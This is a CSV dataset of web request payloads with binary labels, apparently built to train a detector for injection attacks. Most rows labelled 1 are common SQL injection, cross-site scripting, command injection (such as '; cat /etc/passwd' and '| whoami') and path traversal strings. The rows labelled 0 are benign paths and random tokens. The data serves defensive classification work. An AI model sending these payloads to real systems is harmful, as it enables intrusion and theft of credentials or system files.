payload,label
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
' OR 8=9 --,1
home,0
' OR 8=5 --,1
blog,0
/contact?id=1335,0
<script>var a=364;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=564;alert(a)</script>,1
/dashboard?session=71684,0
onerror=alert(1),1
vM23JVqnO3T,0
s E l E c T * f R o M a d m i n,1
/cart?id=8169,0
| whoami,1
javascript:alert(1),1
/contact?session=68250,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=476;alert(a)</script>,1
<script>var a=929;alert(a)</script>,1
/login?session=87510,0
h27XZR2NKTb,0
' OR 1=8 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=194;alert(a)</script>,1
' OR 5=8 --,1
/profile?session=11829,0
/register?session=97157,0
' OR 1=8 --,1
| whoami,1
/cart?session=94442,0
' OR 4=7 --,1
<script>var a=752;alert(a)</script>,1
/about?id=4007,0
' OR 7=4 --,1
/register?session=48010,0
/blog?session=78151,0
blog,0
admin'/* bypass */OR 1=1,1
/register?id=7190,0
<script>var a=320;alert(a)</script>,1
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=5383,0
' OR '1'='1,1
4XgolSuhC8kix,0
javascript:alert(1),1
/settings?id=1117,0
login,0
/login?id=7562,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
3ZuPePjkuHHT2rt,0
/user?id=9158,0
/home?id=7894,0
<script>var a=65;alert(a)</script>,1
<script>var a=518;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=633;alert(a)</script>,1
admin' --,1
Zq1x0PifXDK,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=685;alert(a)</script>,1
settings,0
<script>var a=469;alert(a)</script>,1
' OR 1=1 --,1
' OR 1=9 --,1
dashboard,0
' OR 9=1 --,1
../../../windows/win.ini,1
settings,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
about,0
/home?id=7397,0
onerror=alert(1),1
../../../../etc/passwd,1
<script>var a=67;alert(a)</script>,1
<script>var a=23;alert(a)</script>,1
' OR 2=3 --,1
<script>var a=308;alert(a)</script>,1
' OR 5=9 --,1
/user?session=34444,0
admin%00' OR 1=1,1
/home?session=14508,0
/dashboard?id=3748,0
' OR 8=3 --,1
' OR 2=6 --,1
' OR '1'='1,1
SIadLfPxPwwn,0
' OR 3=5 --,1
/profile?session=43447,0
KzTjipBH,0
' OR 4=1 --,1
/home?id=9187,0
' OR 2=8 --,1
/user?session=57015,0
/settings?id=9150,0
' OR '1'='1,1
/contact?session=27419,0
admin' --,1
' OR 9=8 --,1
cart,0
/index?session=98237,0
<script>var a=591;alert(a)</script>,1
/login?session=56711,0
YFajUYDCP,0
register,0
/dashboard?id=8572,0
/checkout?id=9372,0
<script>var a=867;alert(a)</script>,1
/index?session=97879,0
/cart?session=27054,0
<script>var a=558;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
blog,0
; cat /etc/passwd,1
<script>var a=908;alert(a)</script>,1
../../../../etc/passwd,1
' OR 8=6 --,1
mRpJ8cLjK0MtP,0
' OR 8=7 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?session=62720,0
/register?session=84559,0
<script>var a=706;alert(a)</script>,1
admin' --,1
/blog?id=6700,0
' OR 2=8 --,1
/blog?id=2423,0
index,0
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
/blog?session=22030,0
qUm8bNzz2G4O,0
/index?session=37358,0
/contact?id=5390,0
admin'/* bypass */OR 1=1,1
| whoami,1
' OR '1'='1,1
<script>var a=388;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
contact,0
/user?session=98588,0
/login?id=8089,0
<script>var a=972;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
profile,0
/checkout?id=6587,0
/index?session=56563,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?id=6448,0
/settings?session=47684,0
admin' --,1
/index?session=84356,0
' OR 4=6 --,1
<script>var a=880;alert(a)</script>,1
/profile?id=3417,0
zm1zrDax,0
settings,0
cart,0
/profile?id=4551,0
javascript:alert(1),1
' OR 7=6 --,1
<script>var a=76;alert(a)</script>,1
onerror=alert(1),1
settings,0
/contact?id=944,0
/search?id=1628,0
/search?id=8106,0
| whoami,1
/about?id=2928,0
register,0
contact,0
../../../../etc/passwd,1
/cart?session=79787,0
q6zO8PJk,0
s E l E c T * f R o M a d m i n,1
contact,0
SX46TX2QR63,0
i6id9upK8SupLQy,0
/cart?id=8163,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
<script>var a=740;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cohQLXiJMtqQG,0
<script>var a=499;alert(a)</script>,1
onerror=alert(1),1
/search?session=39438,0
/login?id=2980,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?id=8090,0
user,0
' OR 1=1 --,1
/profile?session=35331,0
user,0
<script>var a=144;alert(a)</script>,1
<script>var a=632;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>var a=68;alert(a)</script>,1
admin' --,1
<script>var a=97;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/settings?session=19702,0
admin' --,1
1' o r '1'='1,1
cCezxPc4nmAuO6,0
/dashboard?id=2214,0
hfZnnCwL,0
/login?id=1834,0
' OR 8=7 --,1
/profile?id=6115,0
contact,0
<script>var a=355;alert(a)</script>,1
| whoami,1
/index?id=8348,0
login,0
<script>var a=721;alert(a)</script>,1
/checkout?session=26799,0
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
admin%00' OR 1=1,1
/home?session=98075,0
/index?id=6364,0
s E l E c T * f R o M a d m i n,1
<script>var a=595;alert(a)</script>,1
GCKisLKrWlUDGJ,0
/about?id=4077,0
' OR 2=2 --,1
/profile?session=85242,0
s E l E c T * f R o M a d m i n,1
/login?id=2890,0
<script>var a=596;alert(a)</script>,1
/user?session=39209,0
register,0
1' o r '1'='1,1
javascript:alert(1),1
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
| whoami,1
<script>alert(document.cookie)</script>,1
admin' --,1
admin'/* bypass */OR 1=1,1
<script>var a=514;alert(a)</script>,1
admin%00' OR 1=1,1
' OR 7=4 --,1
/settings?session=25832,0
aKsvtaShO5zyZ55,0
' OR 7=6 --,1
admin'/* bypass */OR 1=1,1
LEiklmojksfB,0
/index?session=52566,0
../../../windows/win.ini,1
../../../windows/win.ini,1
onerror=alert(1),1
admin' --,1
H8MdbBFYiH,0
/settings?id=5874,0
' OR 9=7 --,1
home,0
../../../windows/win.ini,1
' OR '1'='1,1
' OR 5=6 --,1
/index?session=25084,0
| whoami,1
/login?id=3138,0
<script>var a=451;alert(a)</script>,1
' OR 9=1 --,1
/dashboard?id=5929,0
<script>var a=204;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/contact?id=5194,0
<script>var a=552;alert(a)</script>,1
../../../../etc/passwd,1
urH3X9bS5cpqM,0
' OR 8=4 --,1
igmHc8wP0Pb,0
; cat /etc/passwd,1
' OR 2=3 --,1
1' o r '1'='1,1
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
/about?id=5722,0
/settings?session=18920,0
/checkout?id=4554,0
admin' --,1
/dashboard?session=78836,0
GAyv4uVPc,0
; cat /etc/passwd,1
1' o r '1'='1,1
../../../windows/win.ini,1
../../../windows/win.ini,1
0ZAP8oDHFJljc,0
about,0
/user?id=721,0
admin' --,1
DclCpFW0YOeVVDg,0
javascript:alert(1),1
LWrl0gaJ6,0
../../../windows/win.ini,1
<script>var a=968;alert(a)</script>,1
' OR 5=1 --,1
/cart?session=19097,0
/settings?id=6532,0
I4BmhN2RVV1f0ME,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
dashboard,0
<script>var a=496;alert(a)</script>,1
/checkout?session=56905,0
' OR 3=9 --,1
<script>var a=903;alert(a)</script>,1
onerror=alert(1),1
/profile?id=4545,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
m7sDQn7nPy9v,0
' OR 7=3 --,1
' OR 4=6 --,1
/dashboard?session=87904,0
/home?session=41778,0
<script>alert(document.cookie)</script>,1
/profile?id=6903,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?id=3992,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=327;alert(a)</script>,1
/dashboard?session=46058,0
| whoami,1
s E l E c T * f R o M a d m i n,1
' OR 6=3 --,1
' OR '1'='1,1
/user?session=51358,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?session=62264,0
| whoami,1
index,0
<script>var a=143;alert(a)</script>,1
' OR 8=9 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
javascript:alert(1),1
/search?session=63781,0
ptnntN74aT4SU,0
' OR 9=3 --,1
lSsTgSWaxrzpr05,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
' OR 9=5 --,1
admin%00' OR 1=1,1
MgTZbz37m,0
/cart?session=25784,0
cart,0
3pC6eGOtIDtp,0
onerror=alert(1),1
/checkout?session=74153,0
/cart?id=3393,0
settings,0
/index?session=67013,0
' OR 1=1 --,1
yRI08mEbQrGgO,0
' OR 6=4 --,1
/register?id=7379,0
../../../../etc/passwd,1
/search?id=4170,0
/home?session=86391,0
/dashboard?session=60613,0
' OR 7=3 --,1
CDmMdAnZ,0
/register?session=85963,0
' OR 2=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
/checkout?id=987,0
' OR 5=9 --,1
../../../../etc/passwd,1
' OR 8=3 --,1
' OR 7=3 --,1
tVzbmPTBTOJ,0
| whoami,1
/contact?id=6247,0
' OR 3=2 --,1
<script>var a=803;alert(a)</script>,1
' OR 2=1 --,1
' OR 6=2 --,1
smFJwr08p,0
/register?id=8531,0
/checkout?id=4055,0
' OR '1'='1,1
dashboard,0
<script>var a=988;alert(a)</script>,1
/cart?session=94521,0
/index?id=4005,0
<script>var a=529;alert(a)</script>,1
/search?session=92402,0
; cat /etc/passwd,1
2SI8WPYXd9yYFGu,0
' OR 4=2 --,1
qygCVhRGgKj,0
/contact?session=50469,0
' OR 5=1 --,1
blog,0
/search?session=55584,0
<script>alert(document.cookie)</script>,1
/checkout?id=2969,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=83419,0
admin' --,1
| whoami,1
register,0
<script>var a=452;alert(a)</script>,1
<script>var a=857;alert(a)</script>,1
' OR 1=8 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
dashboard,0
' OR 2=4 --,1
/blog?session=18280,0
/dashboard?id=9333,0
<script>var a=158;alert(a)</script>,1
lf9gJqSh8VSn6,0
/register?session=17923,0
; cat /etc/passwd,1
/home?session=46215,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
1' o r '1'='1,1
kGfY2t9yK,0
/dashboard?session=77226,0
2vV28XOgPBo,0
' OR '1'='1,1
6BDHjXG8CfXdVE,0
about,0
ra7HoFqzFr24,0
<script>var a=171;alert(a)</script>,1
../../../windows/win.ini,1
cart,0
' OR 1=1 --,1
/about?session=16440,0
admin' --,1
/home?session=50905,0
J8WBOkpwNPwt,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
/login?id=2995,0
<script>var a=152;alert(a)</script>,1
profile,0
ls5H3luYz5pTw,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
checkout,0
/blog?id=7081,0
/blog?id=1447,0
<script>alert(document.cookie)</script>,1
<script>var a=255;alert(a)</script>,1
/profile?session=46317,0
| whoami,1
' OR 4=4 --,1
' OR 8=5 --,1
<script>var a=444;alert(a)</script>,1
about,0
/home?id=3979,0
/about?session=91237,0
65zv15ErS6or,0
onerror=alert(1),1
XZtzLCGSVw7,0
/register?session=47697,0
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
4EWfX4Qlhyfkm2Y,0
<script>alert(document.cookie)</script>,1
2UAlNIBx,0
1' o r '1'='1,1
index,0
/dashboard?id=8953,0
/cart?id=5468,0
<script>var a=690;alert(a)</script>,1
JHFMFjif9GUJ0,0
login,0
UgLjQT6XfpZC7Cf,0
javascript:alert(1),1
1' o r '1'='1,1
/login?session=26236,0
<script>var a=425;alert(a)</script>,1
/user?session=47955,0
<script>var a=199;alert(a)</script>,1
/dashboard?session=16706,0
<script>alert(document.cookie)</script>,1
/contact?session=16002,0
/profile?id=2540,0
index,0
admin' --,1
index,0
contact,0
about,0
/blog?session=19868,0
cart,0
<script>var a=341;alert(a)</script>,1
/user?id=18,0
<script>alert(document.cookie)</script>,1
ahvShD6BjPLwr,0
<script>var a=411;alert(a)</script>,1
jAmyOEks5xIxIa,0
njyV1P2oN,0
/about?session=73762,0
s E l E c T * f R o M a d m i n,1
/home?session=47619,0
' OR 6=5 --,1
profile,0
/checkout?id=2609,0
/search?id=6294,0
RHjkrLDhzqQSmcW,0
<script>var a=719;alert(a)</script>,1
<script>var a=672;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
<script>var a=601;alert(a)</script>,1
<script>var a=157;alert(a)</script>,1
QhKdvh4lSGBvPJB,0
/user?id=9473,0
cart,0
../../../../etc/passwd,1
/settings?id=6589,0
UuUM3zzOhP3LgU9,0
/settings?id=6523,0
dElJw2Ih1DER,0
blog,0
../../../../etc/passwd,1
/index?session=65291,0
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
<script>var a=864;alert(a)</script>,1
register,0
' OR 4=8 --,1
<script>var a=765;alert(a)</script>,1
<script>var a=878;alert(a)</script>,1
<script>var a=250;alert(a)</script>,1
admin' --,1
/checkout?id=2812,0
fjIw8peQ,0
/index?session=11783,0
admin' --,1
; cat /etc/passwd,1
QoLcAtlQ8kIKUTT,0
' OR 1=1 --,1
| whoami,1
MxH66OZfYBPxN,0
/contact?session=75439,0
user,0
wSZEbjN5zKxunq,0
EDKlecOiQM4Fp,0
/user?session=56169,0
s E l E c T * f R o M a d m i n,1
' OR 9=1 --,1
/settings?session=35220,0
<script>var a=998;alert(a)</script>,1
' OR 1=5 --,1
nBjyIi1wjN,0
user,0
/index?id=4389,0
/about?id=3994,0
/login?id=8306,0
yFXmg9U1Nbd5OW,0
/blog?id=6054,0
/checkout?session=30034,0
settings,0
search,0
' OR 1=1 --,1
/blog?id=2785,0
VV9p4tXq,0
| whoami,1
O9VgnCENzTj,0
javascript:alert(1),1
' OR '1'='1,1
settings,0
../../../windows/win.ini,1
<script>var a=492;alert(a)</script>,1
/register?id=4286,0
/checkout?id=9159,0
' OR 7=2 --,1
' OR 4=2 --,1
ozDlvLMtJ,0
/index?session=21198,0
o0seKL4Kw,0
<script>var a=71;alert(a)</script>,1
admin' --,1
| whoami,1
zD7LsQfwvy,0
' OR '1'='1,1
<script>var a=682;alert(a)</script>,1
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=1 --,1
1' o r '1'='1,1
/settings?session=34419,0
<script>var a=503;alert(a)</script>,1
UVB8AJLEkkMX,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=8 --,1
/cart?session=26311,0
login,0
/checkout?session=42856,0
/settings?session=76531,0
Y5L4JHeNVAUvNIA,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/index?session=24743,0
blog,0
fn7JX1IDyjsT,0
3Q3brT5hsiMVVo,0
/login?id=3449,0
qWbAf4nI,0
' OR '1'='1,1
/home?id=2353,0
' OR 3=2 --,1
login,0
/profile?id=2343,0
/profile?session=17527,0
/profile?session=10409,0
' OR 5=8 --,1
; cat /etc/passwd,1
javascript:alert(1),1
<script>var a=646;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>var a=437;alert(a)</script>,1
onerror=alert(1),1
nGOaZEtDASZo,0
user,0
/user?session=46046,0
cart,0
| whoami,1
l2txtmXUiel,0
YTwQCx0i4P,0
' OR 1=7 --,1
/checkout?session=72751,0
../../../../etc/passwd,1
' OR 3=3 --,1
U5l0OdjTn2le,0
login,0
' OR '1'='1,1
profile,0
/checkout?session=92598,0
/checkout?session=73970,0
../../../../etc/passwd,1
../../../../etc/passwd,1
jQ8IFGne2,0
/login?id=7645,0
admin'/* bypass */OR 1=1,1
search,0
/index?id=7943,0
/profile?id=3428,0
Q0j0LvRX,0
| whoami,1
/contact?session=39670,0
admin%00' OR 1=1,1
/contact?id=5605,0
<script>var a=961;alert(a)</script>,1
' OR 9=5 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
WC208UyQ4X,0
QZfBXGwuDiRN4K,0
; cat /etc/passwd,1
| whoami,1
1' o r '1'='1,1
' OR 4=7 --,1
2k7ZTWtTJ7HKj,0
checkout,0
<script>var a=141;alert(a)</script>,1
' OR 4=1 --,1
NcXH13RRXgiP,0
admin' --,1
/about?id=9107,0
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=145;alert(a)</script>,1
' OR 8=1 --,1
cart,0
1' o r '1'='1,1
' OR 8=3 --,1
' OR 6=5 --,1
register,0
about,0
<script>var a=231;alert(a)</script>,1
/blog?session=27554,0
search,0
cart,0
/contact?session=15352,0
/home?session=74367,0
; cat /etc/passwd,1
login,0
; cat /etc/passwd,1
i4AMu0Aom5fS,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?id=6807,0
' OR 4=3 --,1
' OR '1'='1,1
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=997,0
/home?session=13797,0
' OR 4=9 --,1
/dashboard?session=39346,0
/dashboard?id=7976,0
admin%00' OR 1=1,1
' OR 2=2 --,1
sKktgA31iOYMHAJ,0
' OR 7=3 --,1
/contact?session=87906,0
/login?session=57931,0
/contact?session=19388,0
' OR 9=1 --,1
<script>alert(document.cookie)</script>,1
Eowo6K8Jq9P,0
rKqX49hY6RT,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?id=3237,0
/profile?session=61361,0
<script>var a=468;alert(a)</script>,1
PKmRBAALJ4z,0
contact,0
/login?session=95866,0
' OR 2=4 --,1
' OR 1=1 --,1
' OR 7=3 --,1
W2gbcgp097M10Ay,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
/cart?session=47331,0
register,0
' OR 3=8 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?id=3067,0
QKmaJwXwakw5a,0
Z91jev3iTU2,0
eRYbhaQDdg,0
Lj6ov1yrutk,0
/index?id=1313,0
/search?session=47292,0
/user?session=90332,0
contact,0
/home?session=73196,0
' OR 5=7 --,1
' OR 7=3 --,1
s E l E c T * f R o M a d m i n,1
/login?session=90442,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
A3p9pRoQmva,0
H3xV8nvR23w,0
' OR 2=7 --,1
cart,0
gy19hZpsHLcQiR,0
<script>alert(document.cookie)</script>,1
/about?id=7316,0
8eKHSW3LScG,0
profile,0
javascript:alert(1),1
' OR '1'='1,1
/cart?session=89774,0
/register?session=61688,0
/dashboard?session=96186,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
checkout,0
k9wE1Muw,0
q6z3MKqFzL8C,0
<script>var a=89;alert(a)</script>,1
' OR '1'='1,1
<script>var a=483;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=4 --,1
index,0
login,0
1' o r '1'='1,1
/settings?session=18816,0
31P7az6vhKSHJLk,0
' OR 7=7 --,1
/checkout?id=4986,0
' OR 3=5 --,1
' OR 2=4 --,1
admin'/* bypass */OR 1=1,1
/login?session=75046,0
home,0
| whoami,1
' OR 1=1 --,1
onerror=alert(1),1
onerror=alert(1),1
cart,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=60998,0
cart,0
contact,0
/index?id=9457,0
/dashboard?session=51633,0
<script>var a=118;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
xRgXe6DW07m7,0
checkout,0
/login?session=47346,0
<script>var a=126;alert(a)</script>,1
/blog?id=2199,0
/login?session=65086,0
sGmkYXZc,0
y3VjJQ3vb9fDd,0
/user?id=941,0
<script>var a=400;alert(a)</script>,1
blog,0
javascript:alert(1),1
/user?session=14332,0
| whoami,1
/register?session=36002,0
/contact?session=12600,0
<script>var a=966;alert(a)</script>,1
S6Fy4ThAdc1IA,0
/login?id=4378,0
' OR 1=1 --,1
blog,0
uOZt90037,0
/dashboard?session=81753,0
admin' --,1
' OR 6=2 --,1
<script>var a=542;alert(a)</script>,1
' OR 1=6 --,1
register,0
' OR 4=5 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
<script>var a=224;alert(a)</script>,1
' OR 1=1 --,1
; cat /etc/passwd,1
YglpxouHWgMJyO,0
/index?id=5050,0
<script>var a=206;alert(a)</script>,1
' OR 9=4 --,1
' OR 3=8 --,1
/settings?id=7526,0
admin' --,1
' OR 4=1 --,1
1vrIOKyV3zKsi,0
/profile?session=76246,0
' OR 5=9 --,1
register,0
' OR 6=6 --,1
index,0
Cjqn78GI,0
onerror=alert(1),1
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 4=9 --,1
jZFsqbCwE,0
' OR 6=1 --,1
' OR 1=1 --,1
' OR 5=6 --,1
IGnGDi1HnWjQ,0
' OR '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?id=8366,0
<script>var a=382;alert(a)</script>,1
index,0
/profile?id=3154,0
admin%00' OR 1=1,1
../../../windows/win.ini,1
checkout,0
t4PEChed,0
dashboard,0
/home?session=16897,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 4=8 --,1
checkout,0
<script>var a=157;alert(a)</script>,1
5nTgD0KOHz,0
' OR 1=9 --,1
; cat /etc/passwd,1
1' o r '1'='1,1
/login?id=173,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
admin%00' OR 1=1,1
/about?id=9571,0
checkout,0
/cart?session=10123,0
admin'/* bypass */OR 1=1,1
/settings?id=7573,0
/cart?id=9545,0
' OR 5=7 --,1
' OR 2=6 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=5 --,1
/profile?id=2403,0
/profile?id=7243,0
/register?session=16644,0
/index?session=15909,0
' OR '1'='1,1
/contact?id=4785,0
/cart?id=4068,0
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
/blog?id=6469,0
../../../windows/win.ini,1
admin%00' OR 1=1,1
onerror=alert(1),1
; cat /etc/passwd,1
' OR 6=2 --,1
1' o r '1'='1,1
onerror=alert(1),1
qjljtW6wq5LyPVd,0
PskIXn56tb,0
/about?id=8568,0
s E l E c T * f R o M a d m i n,1
blog,0
cart,0
/blog?session=61056,0
' OR 6=4 --,1
; cat /etc/passwd,1
admin' --,1
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
' OR 3=5 --,1
6CCxIr46C,0
/index?id=8545,0
dashboard,0
<script>var a=392;alert(a)</script>,1
/cart?session=94678,0
admin%00' OR 1=1,1
DwtJwADow,0
' OR 8=2 --,1
<script>var a=305;alert(a)</script>,1
admin%00' OR 1=1,1
<script>var a=420;alert(a)</script>,1
onerror=alert(1),1
<script>var a=433;alert(a)</script>,1
' OR 4=7 --,1
/dashboard?session=45471,0
1' o r '1'='1,1
/settings?id=7395,0
/login?session=72779,0
user,0
' OR 1=1 --,1
admin%00' OR 1=1,1
/blog?id=7747,0
../../../../etc/passwd,1
GmvG1unCmpIHML,0
/checkout?session=74390,0
wooNJNkI3,0
i8yDO0DMMiWR,0
admin' --,1
' OR 5=7 --,1
settings,0
s E l E c T * f R o M a d m i n,1
/login?session=30304,0
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
QUWmsopUBRxwl,0
/user?id=3584,0
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
index,0
<script>var a=374;alert(a)</script>,1
/dashboard?session=60473,0
index,0
/login?session=10514,0
../../../../etc/passwd,1
Vu3K3G6Crs,0
/cart?id=5442,0
/checkout?id=5142,0
/dashboard?id=8154,0
javascript:alert(1),1
qUAVvqUUW2L86y,0
Ru5bbM4f0XthC,0
/home?id=7716,0
<script>var a=140;alert(a)</script>,1
Sc9fsVx6W3N,0
admin%00' OR 1=1,1
../../../windows/win.ini,1
onerror=alert(1),1
<script>var a=941;alert(a)</script>,1
/settings?session=55482,0
about,0
checkout,0
/checkout?session=49595,0
/blog?session=88751,0
s E l E c T * f R o M a d m i n,1
/profile?id=5613,0
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
v4VbyQR3CeZMpR,0
/home?session=87643,0
sSszdobhLum1qnU,0
<script>var a=127;alert(a)</script>,1
/about?session=64815,0
onerror=alert(1),1
/index?id=658,0
| whoami,1
/profile?id=6978,0
/checkout?id=556,0
javascript:alert(1),1
EM4y21FYaE,0
/profile?session=57406,0
XlMKSjQRFH9,0
' OR '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
javascript:alert(1),1
<script>var a=503;alert(a)</script>,1
search,0
../../../../etc/passwd,1
; cat /etc/passwd,1
admin%00' OR 1=1,1
' OR 4=8 --,1
cart,0
admin%00' OR 1=1,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
/home?session=66039,0
dashboard,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/index?session=25971,0
/checkout?id=6310,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=722;alert(a)</script>,1
/home?id=7259,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
' OR 1=1 --,1
qTe0TI0eN,0
/home?id=7412,0
<script>var a=796;alert(a)</script>,1
ena97or5G,0
/contact?session=33564,0
/cart?session=21910,0
../../../windows/win.ini,1
/index?id=4033,0
/search?id=404,0
profile,0
/search?session=86240,0
' OR 1=1 --,1
../../../../etc/passwd,1
/search?session=94911,0
' OR 7=3 --,1
' OR 3=9 --,1
' OR '1'='1,1
/settings?session=70696,0
